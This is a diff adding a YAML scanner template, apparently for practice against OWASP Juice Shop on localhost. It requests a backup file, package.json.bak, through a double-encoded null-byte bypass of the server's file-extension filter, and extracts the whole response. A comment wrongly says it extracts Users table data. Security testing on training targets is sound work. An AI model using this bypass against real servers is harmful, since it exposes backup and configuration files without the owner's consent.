@@ -1,0 +1,29 @@
+id: developer_backup_disclosure_sensitive_data
+
+info:
+  name: developer_backup
+  author: your_name
+  severity: info
+  description: 
+
+requests:
+  - raw:
+      - |
+        GET /ftp/package.json.bak%25%30%30.md HTTP/1.1
+        Host: 127.0.0.1:3000
+        
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        words:
+          - "juice-shop"
+        part: body
+
+    extractors:
+      - type: regex
+        regex:
+          - "(.*)"  # Trích xuất data của bảng Users
+        part: body
